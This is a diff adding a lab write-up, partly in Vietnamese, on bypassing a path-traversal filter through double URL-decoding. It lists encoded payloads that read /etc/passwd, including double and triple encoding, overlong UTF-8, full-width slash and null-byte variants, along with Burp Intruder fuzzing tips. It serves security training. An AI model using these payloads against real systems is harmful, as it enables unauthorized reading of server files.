@@ -1,0 +1,31 @@
+Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
+
+"
+This lab contains a path traversal vulnerability in the display of product images.
+The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.
+To solve the lab, retrieve the contents of the /etc/passwd file.
+"
+
+1. Server Architecture
+Client -> Web Server -> Application Server -> Database
+Web Server (Nginx/Apache/IIS): Cổng đầu tiên, decode lần 1 để định tuyến (Routing).
+App Server (Code PHP/Java/Python): Nhận dữ liệu, code bên trong (hoặc framework) decode lần 2 để xử lý logic.
+Đôi khi có thêm WAF hoặc Load Balancer decode thêm lần nữa.
+
+2. Double URL encoding
+Payload: ../
+First URL encoding: ..%2f..%2f..%2fetc/passwd
+Double URL encoding: ..%252f..%252f..%252fetc/passwd
+Triple URL encoding: ..%25252f..%25252f..%25252fetc/passwd
+(Rare, but possible)
+
+3. Advance Bypass Techniques
+Overlong UTF-8: ..%c0%af (Dùng 2 byte để biểu diễn ký tự / thay vì 1 byte chuẩn).
+Unicode Full-width: ..%ef%bc%8f (Ký tự ／ của tiếng Nhật/Hàn → App tự sửa thành /).
+Null Byte: %00 (Cắt đuôi chuỗi trong các hệ thống cũ/C-based).
+
+4. Attack methods
+Công cụ: Burp Suite Intruder.
+Tài nguyên: Wordlist từ Seclists (mục Fuzzing → LFI/Path Traversal).
+(search Seclists Fuzzing LFI Path Traversal trên Google để tải về).
+Dấu hiệu thành công: HTTP 200 OK, Độ dài phản hồi (Content-Length) khác biệt, hoặc hiện nội dung file /etc/passwd.
